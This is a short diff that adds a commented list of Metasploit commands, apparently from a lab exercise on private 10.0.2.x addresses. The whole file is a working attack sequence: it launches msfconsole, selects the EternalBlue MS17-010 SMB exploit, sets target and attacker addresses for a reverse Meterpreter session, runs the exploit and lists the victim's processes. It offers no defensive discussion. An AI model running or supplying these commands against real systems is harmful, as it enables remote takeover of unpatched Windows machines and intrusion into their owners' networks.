@@ -1,0 +1,20 @@
+
+# Metasploit commands used to exploit the target and list processes:
+
+# Start the Metasploit console
+msfconsole
+
+# Use the EternalBlue exploit
+use exploit/windows/smb/ms17_010_eternalblue
+
+# Set the target's IP address
+set RHOSTS 10.0.2.9
+
+# Set the attacker's IP address
+set LHOST 10.0.2.4
+
+# Exploit the target system
+exploit
+
+# Once a Meterpreter session is established, list the running processes
+ps
